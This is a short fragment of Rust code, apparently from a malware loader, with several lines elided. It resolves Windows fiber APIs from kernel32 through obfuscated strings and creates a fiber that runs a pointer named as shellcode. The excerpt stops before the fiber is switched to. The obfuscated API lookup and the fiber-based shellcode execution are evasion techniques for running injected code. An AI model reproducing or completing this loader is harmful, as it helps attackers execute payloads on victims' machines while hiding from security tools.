...
pub unsafe fn exec(p: usize) -> Result<(), String> {
    ...
    let p_convert = get_proc_address(kernel32, obfbytes!(b"ConvertThreadToFiber\0").as_slice())?;
    let p_create = get_proc_address(kernel32, obfbytes!(b"CreateFiber\0").as_slice())?;
    let p_switch = get_proc_address(kernel32, obfbytes!(b"SwitchToFiber\0").as_slice())?;
    ...
    if primary_fiber.is_null() {
        return Err(obfstr!("ConvertThreadToFiber failed").to_string());
    }

    let shellcode_fiber = create_fiber(0, transmute(p), null_mut());
    if shellcode_fiber.is_null() {
        return Err(obfstr!("CreateFiber failed").to_string());
    }
